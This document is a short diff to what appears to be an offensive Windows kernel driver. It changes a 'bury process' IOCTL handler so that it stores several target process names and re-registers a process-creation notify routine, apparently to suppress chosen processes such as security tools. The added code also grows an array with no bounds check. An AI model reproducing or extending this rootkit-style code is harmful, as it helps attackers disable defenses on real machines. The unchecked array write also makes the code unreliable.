@@ -236,25 +236,18 @@ BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
             return STATUS_UNSUCCESSFUL;
         }
 
-        if (BeGlobals::buryProcess.buryRoutineAdded)
-        {
-            DbgPrint("Routine already exists! \r\n");
-            return STATUS_SUCCESS; // TODO: return status indicating that one was already added
-        }
-
         // Allocate global memory for process name and copy over to global
-        BeGlobals::buryProcess.beBuryTargetProcessName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, dwSize, DRIVER_TAG);
-        if (!BeGlobals::buryProcess.beBuryTargetProcessName)
+        BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length] = (WCHAR*)ExAllocatePoolWithTag(PagedPool, dwSize, DRIVER_TAG);
+        if (!BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length])
         {
             return STATUS_MEMORY_NOT_ALLOCATED;
         }
-        RtlCopyMemory(BeGlobals::buryProcess.beBuryTargetProcessName, processToBury, dwSize);
+        RtlCopyMemory(BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length], processToBury, dwSize);
+        BeGlobals::beBuryTargetProcesses.length++; // increment number of processes buried
 
-        DbgPrint("String now: %ws \r\n", BeGlobals::buryProcess.beBuryTargetProcessName);
-
+        NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE); // remove to avoid routines being registered twice
         NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, FALSE);
-        BeGlobals::buryProcess.buryRoutineAdded = TRUE;
-
+        
         if (NtStatus == STATUS_SUCCESS)
         {
             DbgPrint("Added routine!\n");
